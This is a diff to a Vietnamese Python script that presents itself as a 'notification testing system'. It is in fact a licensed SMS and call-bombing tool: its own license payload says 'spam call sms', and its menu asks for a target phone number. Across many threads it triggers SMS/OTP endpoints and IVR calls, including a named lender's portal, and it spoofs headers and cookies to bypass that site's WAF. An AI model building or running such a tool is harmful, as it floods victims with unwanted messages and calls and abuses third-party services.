@@ -15,11 +15,11 @@ from urllib3.util import Retry
 # ==========================================
 # BỘ MÃ MÀU ANSI TRANG TRÍ TERMINAL
 # ==========================================
-C = '\033[96m'  # Cyan (Xanh lơ)
-G = '\033[92m'  # Green (Xanh lá)
-R = '\033[91m'  # Red (Đỏ)
-Y = '\033[93m'  # Yellow (Vàng)
-W = '\033[0m'   # White/Reset (Trắng - Trả về mặc định)
+C = '\033[96m'  # Cyan (Xanh lơ - Dùng cho viền và thông tin)
+G = '\033[92m'  # Green (Xanh lá - Dùng cho Success)
+R = '\033[91m'  # Red (Đỏ - Dùng cho Lỗi)
+Y = '\033[93m'  # Yellow (Vàng - Dùng cho Cảnh báo/Timeout)
+W = '\033[0m'   # White/Reset (Trả về màu mặc định)
 
 # ==========================================
 # CẤU HÌNH HỆ THỐNG LICENSE (BẢN QUYỀN)
@@ -28,7 +28,7 @@ SERVER_URL = "https://shopvietx.io.vn/api/license"
 KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")
 
 # ==========================================
-# CẤU HÌNH LOGGING CÓ MÀU SẮC THỜI GIAN
+# CẤU HÌNH LOGGING CÓ MÀU SẮC
 # ==========================================
 logging.basicConfig(
     level=logging.INFO,
@@ -41,9 +41,9 @@ logger = logging.getLogger("MatrixCloudEngine")
 class CloudTestingEngine:
     def __init__(self):
         self.session = requests.Session()
-        self.timeout = 7 
+        self.timeout = 10 
         self.init_session_policy()
-        self.api_database = self.load_apis_from_memory()
+        self.api_database = self.load_apis()
 
     def init_session_policy(self) -> None:
         """Cấu hình kết nối Connection Pool hạn chế tối đa lỗi mạng"""
@@ -60,16 +60,19 @@ class CloudTestingEngine:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
         })
 
-    def load_apis_from_memory(self) -> Dict[str, List[Any]]:
-        """Đọc thẳng dữ liệu được truyền ngầm từ bộ nhớ RAM (globals)"""
+    def load_apis(self) -> Dict[str, List[Any]]:
+        """Hỗ trợ đọc từ RAM hoặc fallback sang apis_config.json"""
         if 'IN_MEMORY_DB' in globals():
             return globals()['IN_MEMORY_DB']
+        elif os.path.exists("apis_config.json"):
+            with open("apis_config.json", "r", encoding="utf-8") as f:
+                return json.load(f)
         
-        logger.error(f"{R}[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM!{W}")
+        logger.error(f"{R}[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API!{W}")
         return {"sms_endpoints": [], "call_endpoints": []}
 
     def sync_ivr_cookies(self, phone: str) -> None:
-        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh - ĐÃ SỬA THEO 6.PY"""
+        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh (Tích hợp từ 6.py)"""
         init_url = "https://lk.vayxanh.com/"
         params = {
             "phone": phone, 
@@ -95,8 +98,8 @@ class CloudTestingEngine:
         }
         try:
             self.session.get(init_url, params=params, headers=headers, timeout=self.timeout)
-            
             cookies_dict = requests.utils.dict_from_cookiejar(self.session.cookies)
+            
             if "_cabinet_key" not in cookies_dict:
                 config_url = "https://lk.vayxanh.com/internal/client/config"
                 self.session.get(config_url, headers=headers, timeout=self.timeout)
@@ -108,22 +111,14 @@ class CloudTestingEngine:
         name = api.get("name", "Dịch vụ ẩn danh")
         url = api.get("url")
         method = api.get("method", "POST").upper()
-        headers = api.get("headers", {}).copy() 
+        headers = api.get("headers", {}).copy()
         
-        # ĐÃ SỬA: Ép định dạng headers di động riêng cho luồng VayXanh để bypass WAF
+        # Bypass WAF riêng cho VayXanh
         if url and "vayxanh" in url.lower():
             headers.update({
-                'accept': 'application/json, text/plain, */*',
-                'accept-language': 'vi-VN',
                 'origin': 'https://lk.vayxanh.com',
                 'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin'
             })
         
         phone_no_zero = phone[1:] if phone.startswith("0") else phone
@@ -135,10 +130,7 @@ class CloudTestingEngine:
                                          .replace("{phone_84}", phone_84)
 
         try:
-            if api.get("is_json"):
-                request_kwargs = {"json": json.loads(formatted_payload)}
-            else:
-                request_kwargs = {"data": formatted_payload}
+            request_kwargs = {"json": json.loads(formatted_payload)} if api.get("is_json") else {"data": formatted_payload}
 
             logger.info(f"{C}[▶ RUNNING] Đang kiểm thử cổng:{W} {name}")
 
@@ -165,10 +157,9 @@ class CloudTestingEngine:
         return False
 
     def trigger_sms_suite(self, phone: str) -> None:
-        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng cực nhanh"""
         sms_list = self.api_database.get("sms_endpoints", [])
         if not sms_list:
-            print(f"{R}[-] Danh sách API trống hoặc nạp từ RAM thất bại.{W}")
+            print(f"{R}[-] Danh sách SMS trống.{W}")
             return
 
         print(f"\n{G}[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...{W}")
@@ -182,9 +173,7 @@ class CloudTestingEngine:
         print(f"{G}[✓] Hoàn tất Suite SMS.{W}")
 
     def trigger_combined_suite(self, phone: str) -> None:
-        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình"""
         self.trigger_sms_suite(phone)
-        
         time.sleep(1.5)
         
         call_list = self.api_database.get("call_endpoints", [])
@@ -203,36 +192,29 @@ class CloudTestingEngine:
         print(f"{C}-{W}" * 55)
         print(f"{G}[✓] Hoàn tất toàn bộ chuỗi tích hợp.{W}")
 
-
 # ==========================================
 # CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
 # ==========================================
 def get_hardware_id() -> str:
-    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
     current_os = platform.system().lower()
     raw_id = "UNKNOWN_DEVICE"
-    
     try:
         if current_os == "windows":
             cmd = "wmic csproduct get uuid"
             output = subprocess.check_output(cmd, shell=True).decode().split()
-            if len(output) >= 2:
-                raw_id = output[1]
+            if len(output) >= 2: raw_id = output[1]
         elif current_os == "linux":
-            if os.path.exists("/etc/machine-id"):
-                with open("/etc/machine-id", "r") as f:
-                    raw_id = f.read().strip()
-            elif os.path.exists("/var/lib/dbus/machine-id"):
-                with open("/var/lib/dbus/machine-id", "r") as f:
-                    raw_id = f.read().strip()
+            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
+                if os.path.exists(path):
+                    with open(path, "r") as f:
+                        raw_id = f.read().strip()
+                    break
     except Exception:
         pass
-
     return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()
 
 
 def verify_license_key(key: str, hardware_id: str) -> bool:
-    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
     try:
         payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
         response = requests.post(SERVER_URL, json=payload, timeout=8)
@@ -246,7 +228,6 @@ def verify_license_key(key: str, hardware_id: str) -> bool:
 
 
 def check_authentication_flow():
-    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
     hw_id = get_hardware_id()
     
     if os.path.exists(KEY_FILE_PATH):
@@ -261,20 +242,19 @@ def check_authentication_flow():
         print(f"{C}         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       {W}")
         print(f"{C}=" * 64 + W)
         print(f"  {Y}[!] Trạng thái: Chưa kích hoạt bản quyền!{W}")
-        print(f"  {C}• Mã máy (HWID) của bạn: {W}{G}{hw_id}{W}")
+        print(f"  {C}• Mã máy (HWID): {W}{G}{hw_id}{W}")
         print(f"  {C}• Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.{W}")
         print(f"{C}-" * 64 + W)
         
-        user_key = input(f"{G}[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): {W}").strip()
+        user_key = input(f"{G}[?] Nhập Key bản quyền (Hoặc '0' để thoát): {W}").strip()
         
         if user_key == "0":
             print(f"{G}[+] Đóng chương trình.{W}")
             sys.exit(0)
             
-        if not user_key:
-            continue
+        if not user_key: continue
             
-        print(f"{G}[+] Đang kiểm tra mã khóa trên hệ thống Server...{W}")
+        print(f"{G}[+] Đang kiểm tra mã khóa...{W}")
         if verify_license_key(user_key, hw_id):
             with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                 f.write(user_key)
@@ -282,33 +262,27 @@ def check_authentication_flow():
             time.sleep(1.5)
             return True
         else:
-            print(f"{R}[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!{W}")
+            print(f"{R}[-] Lỗi: Key không hợp lệ hoặc không dùng cho máy này!{W}")
             input(f"\n{Y}[Nhấn Enter để thử lại...]{W}")
 
-
 def show_banner_introduction():
-    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
     os.system("cls" if platform.system().lower() == "windows" else "clear")
     hw_id = get_hardware_id()
-    
     print(f"{C}=" * 64 + W)
     print(f"{G}         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          {W}")
     print(f"{C}   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) {W}")
     print(f"{C}=" * 64 + W)
-    print(f"  {C}• Phiên bản: {W}Cloud Integration v3.5 (Chạy trên RAM)")
-    print(f"  {C}• Hệ điều hành: {W}{platform.system()} {platform.release()}")
+    print(f"  {C}• Phiên bản: {W}Cloud Integration v4.0 (Đã ghép Core VayXanh)")
     print(f"  {C}• Mã máy của bạn: {W}{hw_id}")
     print(f"  {C}• Trạng thái bản quyền: {G}Đã kích hoạt [✓]{W}")
     print(f"{C}=" * 64 + W)
 
-
 def render_terminal_menu():
     print(f"\n{C}═{W}"*20 + f"{C} MENU ĐIỀU KHIỂN CHÍNH {W}" + f"{C}═{W}"*20)
-    print(f"  {G}[1]{W} chỉ spam SMS (SMS Only)")
+    print(f"  {G}[1]{W} Chỉ spam SMS (SMS Only)")
     print(f"  {G}[2]{W} Chạy toàn diện (SMS + Call)")
-    print(f"  {G}[0]{W} Giải phóng bộ nhớ & Thoát chương trình")
+    print(f"  {G}[0]{W} Thoát chương trình")
     print(f"{C}═{W}"*64)
-
 
 def run_application():
     check_authentication_flow()
@@ -320,12 +294,12 @@ def run_application():
         cmd = input(f"{G}[?] Nhập tùy chọn lệnh (0-2): {W}").strip()
         
         if cmd == "0":
-            print(f"{G}[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!{W}")
+            print(f"{G}[+] Đóng hệ thống!{W}")
             break
         elif cmd in ["1", "2"]:
             phone = input(f"{G}[?] Nhập số điện thoại mục tiêu cần test: {W}").strip()
             if not phone or len(phone) < 9 or not phone.isdigit():
-                print(f"{R}[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!{W}")
+                print(f"{R}[-] Lỗi: Số điện thoại không hợp lệ!{W}")
                 continue
                 
             if cmd == "1":
